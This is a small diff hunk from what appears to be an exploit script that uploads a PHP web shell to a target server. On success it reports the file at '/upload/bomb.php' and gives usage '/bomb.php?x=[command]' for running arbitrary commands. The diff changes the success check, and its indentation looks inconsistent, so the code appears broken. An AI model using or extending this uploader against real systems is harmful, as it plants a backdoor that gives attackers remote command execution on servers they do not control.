@@ -33,7 +33,7 @@ if __name__ == "__main__":
                 print(banner)
                 print('[ |!| ] Connected, uploading file..')
                 time.sleep(2)
-                uploadfile()
+        if uploadfile() == 1:
                 print('[ |!| ] File has been uploaded at "/upload/bomb.php", usage -->> /bomb.php?x=[command]\n')
         else:
                 print('[ |!!| ] Unsuccessful file upload.')
